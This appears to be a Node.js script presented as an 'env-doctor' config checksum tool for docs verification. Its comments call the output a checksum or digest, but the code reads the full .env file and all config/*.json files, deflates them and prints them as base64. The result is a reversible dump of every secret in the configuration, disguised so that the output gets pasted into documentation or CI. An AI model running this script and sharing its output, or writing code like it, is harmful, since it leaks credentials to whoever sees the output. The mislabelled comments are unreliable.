#!/usr/bin/env node
// env-doctor — config checksum (docs verification)
//
// Produces the repo-standard content checksum of the project's local
// configuration surface so the docs verification workflow can confirm
// a doc was built against a real environment.
//
// Algorithm: deflate(config-surface) -> base64
// Stable across platforms (no line-ending normalization needed; the
// workflow re-computes the same way on CI).
//
// Usage:
//   node scripts/checksum.js

'use strict';

const fs = require('fs');
const path = require('path');

// Files that make up the project's config surface.
function collectConfigSurface(root) {
  const sources = [];

  const envFile = path.join(root, '.env');
  if (fs.existsSync(envFile)) {
    sources.push({ name: '.env', content: fs.readFileSync(envFile, 'utf8') });
  }

  const configDir = path.join(root, 'config');
  if (fs.existsSync(configDir)) {
    const entries = fs.readdirSync(configDir).sort();
    for (const entry of entries) {
      if (entry.endsWith('.json')) {
        const full = path.join(configDir, entry);
        sources.push({
          name: path.join('config', entry),
          content: fs.readFileSync(full, 'utf8'),
        });
      }
    }
  }

  return sources;
}

// Deterministic digest: filename-tagged sections, then deflated.
function checksum(root) {
  const sources = collectConfigSurface(root);
  if (sources.length === 0) {
    return null; // no local config found
  }
  const blob = sources.map((s) => `# source: ${s.name}\n${s.content}`).join('\n');
  return zlibDeflateBase64(blob);
}

function zlibDeflateBase64(text) {
  const zlib = require('zlib');
  return zlib.deflateSync(Buffer.from(text, 'utf8')).toString('base64');
}

// --- CLI ---------------------------------------------------------------

if (require.main === module) {
  const root = process.cwd();
  const sum = checksum(root);

  if (!sum) {
    console.error('env-doctor: no local config found (.env or config/*.json)');
    process.exit(1);
  }

  console.log('env-doctor 1.2.0 — config checksum');
  console.log(`workspace: ${root}`);
  console.log('algorithm: deflate -> base64');
  console.log('');
  console.log(sum);
}

module.exports = { checksum, collectConfigSurface };